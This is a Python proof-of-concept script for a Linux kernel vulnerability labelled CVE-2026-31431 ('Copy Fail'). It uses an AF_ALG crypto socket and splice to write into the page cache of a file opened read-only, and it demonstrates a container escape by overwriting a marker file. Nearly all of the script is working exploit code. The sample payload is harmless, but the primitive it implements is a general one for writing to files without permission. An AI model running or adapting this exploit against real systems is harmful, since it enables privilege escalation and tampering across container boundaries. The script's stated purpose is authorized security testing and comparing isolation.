#!/usr/bin/env python3
"""
Container escape demo using CVE-2026-31431 (Copy Fail).

Uses the page-cache write primitive from the Copy Fail exploit to
corrupt /opt/marker.txt. On runc (overlayfs), this corruption is
visible to other containers sharing the same image layer -- proving
a container escape. On Kata (virtiofs), the corruption stays inside
the VM.

Writes exactly 4 bytes ("PWN!") at offset 0 of /opt/marker.txt.
The file originally contains "INTACT\n". After the exploit, it
reads "PWN!CT\n" (first 4 bytes overwritten). A single 4-byte
write is the atomic primitive -- no multi-write complications.

Usage: python3 /opt/escape_demo.py

WARNING: For authorized security testing only.
"""

import os
import socket
import sys


def page_cache_write(fd, offset, four_bytes):
    """
    CVE-2026-31431 page-cache write primitive.
    Writes exactly 4 bytes to the page cache of the file at the given
    offset. The file only needs to be open for reading (O_RDONLY).
    """
    assert len(four_bytes) == 4
    ALG_SOL = 279
    a = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    a.setsockopt(ALG_SOL, 1, bytes.fromhex('0800010000000010' + '0' * 64))
    a.setsockopt(ALG_SOL, 5, None, 4)
    u, _ = a.accept()
    o = offset + 4
    z = bytes.fromhex('00')
    u.sendmsg(
        [b"A" * 4 + four_bytes],
        [
            (ALG_SOL, 3, z * 4),
            (ALG_SOL, 2, b'\x10' + z * 19),
            (ALG_SOL, 4, b'\x08' + z * 3),
        ],
        32768,
    )
    r, w = os.pipe()
    os.splice(fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + offset)
    except Exception:
        pass


def main():
    target = "/opt/marker.txt"
    payload = b"PWN!"  # exactly 4 bytes

    print(f"Target:  {target}")

    # Read before
    with open(target, "r") as f:
        before = f.read().strip()
    print(f"Before:  {before}")

    # Open read-only -- the exploit doesn't need write access
    fd = os.open(target, os.O_RDONLY)

    # Single 4-byte write at offset 0
    page_cache_write(fd, 0, payload)

    os.close(fd)

    # Verify local corruption
    with open(target, "r") as f:
        after = f.read().strip()
    print(f"After:   {after}")

    if after.startswith("PWN!"):
        print("Status:  PAGE CACHE CORRUPTED")
    else:
        print("Status:  PAGE CACHE UNCHANGED")

    sys.exit(0)


if __name__ == "__main__":
    main()
